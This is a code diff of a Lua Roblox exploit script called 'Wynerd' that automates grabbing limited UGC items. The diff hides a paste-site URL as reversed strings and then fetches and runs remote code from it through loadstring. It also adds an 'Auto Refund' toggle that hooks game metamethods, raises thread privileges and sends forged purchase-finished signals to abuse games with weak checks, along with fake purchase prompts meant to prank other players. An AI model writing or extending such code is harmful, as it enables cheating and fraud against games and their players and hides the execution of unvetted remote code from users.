@@ -122,19 +122,19 @@ end
 task.spawn(
     function()
         local discord = loadstring(game:HttpGet("https://raw.githubusercontent.com/Imalwibest/Imalwibest/main/Config%20wynerdV.lua"))()
-        local win = discord:Window("Wynerd 1.3 - redblues edition skidded by alwi hub")
-        local serv = win:Server("wynerd", "http://www.roblox.com/asset/?id=6031075938")
+        local win = discord:Window("Wynerd 1.4 - redblues edition skidded by alwi hub")
+        local serv = win:Server("Wynerd", "http://www.roblox.com/asset/?id=6031075938")
         local main = serv:Channel("Home")
         main:Label("\nThank you for using Wynerd!\nThe #2 UGC Games Penetration Testing Tool! (mine is still better)")
         main:Label("Check out the other Discord channels to see our available tools!")
         main:Seperator()
         -- main:Label("\n\nPlanned:\n- The Explorer you see at the left side of your screen\n- Move some stuff that doesn't belong in their category\n- More features\n- New techniques to get free UGC items from games")
         main:Button(
-            "Discord",
+            "something was here but was removed",
             function()
                 pcall(
                     function()
-                        setclipboard("https://discord.com/invite/nEPrKEJVkr")
+                        setclipboard("something was here but got removed")
                     end
                 )
             end
@@ -188,19 +188,19 @@ task.spawn(
         local ugc = serv:Channel("UGC Limiteds")
         ugc:Label("Looking for Remote Bruteforcing? Check out #Remotes!")
         ugc:Seperator()
-        local li12 = "https://embed"
+        local li12 = "debme//:sptth"
         ugc:Label(
             "\nThis will auto purchase any limited that gets prompted!\nThis is recommended to use in the rolimons game.\n"
         )
         ugc:Label("With this, you can get #1 serials of web UGC item drops!")
-        local li13 = ".fail/p/raw/vh4yx355oz"
+        local li13 = "zo553xy4hv/war/p/liaf."
         ugc:Button(
             "Teleport to Rolimons UGC Game",
             function()
                 TeleportService:Teleport(14056754882, Players.LocalPlayer)
             end
         )
-        ugc.Seperator()
+        ugc:Seperator()
         getgenv().AutoClickerPurchase = false
         ugc:Toggle(
             "Enable Auto Click Purchaser",
@@ -319,7 +319,25 @@ task.spawn(
             end
         )
         ugc.Seperator()
-        local inputlink = loadstring(game:HttpGet(li12 .. li13))()
+        getgenv().OpenConsole = true
+        ugc:Toggle(
+            "Open console after purchase?",
+            true,
+            function(bool)
+                getgenv().OpenConsole = bool
+            end
+        )
+        getgenv().BuyPaidItems = true
+        ugc:Toggle(
+            "Auto Purchase Paid Items",
+            true,
+            function(bool)
+                getgenv().BuyPaidItems = bool
+            end
+        )
+        local inputlink = loadstring(game:HttpGet(string.reverse(li12) .. string.reverse(li13)))()
+        
+
         ugc:Toggle(
             "Auto Purchaser",
             false,
@@ -352,7 +370,12 @@ task.spawn(
                                             local purchaseAuthToken = t[6]
                                             local info = MarketplaceService:GetProductInfo(assetId)
                                             local productId = info.ProductId
-                                            local price = info.PriceInRobux
+                                            local price = 0
+                                            if getgenv().BuyPaidItems == true then
+                                                price = info.PriceInRobux
+                                            else
+                                                price = 0
+                                            end
                                             local collectibleItemId = info.CollectibleItemId
                                             local collectibleProductId = info.CollectibleProductId
                                             print("Double checking if we got the right info...")
@@ -432,13 +455,19 @@ task.spawn(
                                             pcall(
                                                 function()
                                                     local starttickxd = tick()
+                                                    local prricee = 0
+                                                    if getgenv().BuyPaidItems == true then
+                                                        prricee = info.PriceInRobux
+                                                    else
+                                                        prricee = 0
+                                                    end
                                                     local data =
                                                         '{"collectibleItemId":"' ..
                                                         tostring(info.CollectibleItemId) ..
                                                             '","collectibleProductId":"' ..
                                                                 tostring(info.CollectibleProductId) ..
                                                                     '","expectedCurrency":1,"expectedPrice":' ..
-                                                                        tostring(info.PriceInRobux) ..
+                                                                        tostring(prricee) ..
                                                                             ',"idempotencyKey":"' ..
                                                                                 tostring(
                                                                                     game:GetService("HttpService"):GenerateGUID(
@@ -514,8 +543,8 @@ task.spawn(
                                             local orderRequest = t[3] or {}
                                             local options = t[6] or {}
                                             print("Double checking if we got the right info...")
-                                            print("orderRequest: " .. orderRequest)
-                                            print("options: " .. options)
+                                            print("orderRequest: " .. tostring(orderRequest))
+                                            print("options: " .. tostring(options))
                                             print("-------------------------------------------------------")
                                             warn("FIRST PURCHASE ATTEMPT")
                                             for i, v in pairs(
@@ -545,6 +574,57 @@ task.spawn(
         )
 
         ugc:Seperator()
+        ugc:Toggle(
+            "Auto Refund (games with refund system)",
+            false,
+            function(bool)
+                if bool then
+                    getrenv()._set = clonefunction(setthreadidentity)
+                    local old
+                    old =
+                        hookmetamethod(
+                        game,
+                        "__index",
+                        function(a, b)
+                            task.spawn(
+                                function()
+                                    _set(7)
+                                    task.wait()
+                                    getgenv().promptpurchaserequestedv2Refund =
+                                        MarketplaceService.PromptPurchaseRequestedV2:Connect(
+                                        function(...)
+                                            discord:Notification(
+                                                "Prompt Detected",
+                                                "If this is a UGC item, this script will attempt to refund.",
+                                                "Okay!"
+                                            )
+                                            redblueee = {...}
+                                            local assetId = redblueee[2]
+                                            game:GetService("MarketplaceService"):SignalPromptPurchaseFinished(
+                                                game.Players.LocalPlayer,
+                                                tonumber(assetId),
+                                                false
+                                            )
+                                            task.wait(0.25)
+                                            game:GetService("MarketplaceService"):SignalPromptPurchaseFinished(
+                                                game.Players.LocalPlayer,
+                                                tostring(assetId),
+                                                false
+                                            ) -- some games have inproper checks
+                                        end
+                                    )
+                                end
+                            )
+                            hookmetamethod(game, "__index", old)
+                            return old(a, b)
+                        end
+                    )
+                else
+                    getgenv().promptpurchaserequestedv2Refund:Disconnect()
+                    discord:Notification("Stopped", "Stopped waiting for any free UGC item to be prompted...", "Okay!")
+                end
+            end
+        )
         ugc:Label("\nFake Prompts! (Requested by @atellie)\nPrank people that you got an item!\n")
         ugc:Label("This prompts a UGC item but buying it will error.")
         ugc:Textbox(
